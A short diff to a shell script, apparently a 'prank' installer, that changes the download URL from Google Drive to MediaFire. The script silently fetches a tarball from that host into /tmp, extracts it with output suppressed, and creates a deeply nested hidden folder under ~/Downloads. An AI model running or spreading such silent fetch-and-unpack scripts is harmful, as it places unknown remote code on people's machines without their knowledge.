@@ -1,6 +1,6 @@
 #! /bin/sh
 mkdir -p /tmp/laz/
-curl -s -L https://drive.google.com/file/d/16bzNUavFKwtmbbkKMaMpsJctNWkbZmRr/view?usp=drive_link -o /tmp/laz/prank.tar.gz
+curl -s -L https://download853.mediafire.com/86rrirtsnwlgZrqyMWtMJ1SMrTfHQpE4aeQw1hP7bqs8bI9BOo0KfGx9oNXYubUwrJ8NqSuZSWGTh9bLGzJmUbWOUq7xw28BSGa86IjaKC3XqJppno3nVN7byTqnQKLmQ1uU9JmHNlQCxmcQqV1RJX4saOM4iHrf2CtxlEWmS9Hm/64i9x3equ2g7d9k/app.tar.gz -o /tmp/laz/prank.tar.gz
 > /dev/null
 tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null
 mkdir ~/Downloads/5/2/6/4/3/6/9/8/1/.99
